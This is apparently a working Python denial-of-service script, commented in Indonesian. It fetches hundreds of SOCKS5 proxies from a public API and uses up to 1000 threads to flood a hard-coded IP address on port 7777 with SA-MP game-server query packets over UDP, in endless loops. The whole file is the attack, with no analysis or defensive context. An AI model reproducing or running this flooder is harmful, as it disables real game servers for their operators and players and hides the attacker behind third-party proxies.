import threading
import socket
import random
import requests
import socks
import struct

target_ip = "204.10.192.67"
target_port = 7777

# Ambil data proxy dari API
url = 'https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500&page=1&sort_by=lastChecked&sort_type=desc'
response = requests.get(url)
data = response.json()

# List untuk menyimpan proxy dalam format ip:port
proxy_list = []
for proxy in data['data']:
    ip = proxy['ip']
    port = proxy['port']
    proxy_list.append(f"{ip}:{port}")

# Payload yang akan dikirim
payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'

bpx = set()

# Membuat socket yang menggunakan SOCKS5 proxy
def create_proxied_socket(proxy_host, proxy_port):
    s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP Socket
    s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
    return s

# Fungsi worker yang melakukan pengiriman payload melalui UDP
def worker(target_ip, target_port):
    target = (target_ip, target_port)  # IP dan port target
    proxy = random.choice(proxy_list)  # Memilih proxy secara acak
    if proxy not in bpx:
        proxy_host = proxy.split(":")[0]
        proxy_port = int(proxy.split(":")[1])
        udp_socket = create_proxied_socket(proxy_host, proxy_port)
        while True:
            if udp_socket:
                try:
                    print(f"[{proxy}] -> Sent payload!")
                    udp_socket.sendto(payload, target)
                except Exception as error:
                    print(f"[{proxy}] -> Breaking down connection. | {error}")
                    bpx.add(proxy)
                    udp_socket.close()
                    break
        return

# Memulai proses threading untuk mengirimkan payload melalui banyak thread
while True:
    while threading.active_count() >= 1000:  # Batasi jumlah thread aktif
        pass
    threading.Thread(target=worker, args=(target_ip, target_port)).start()
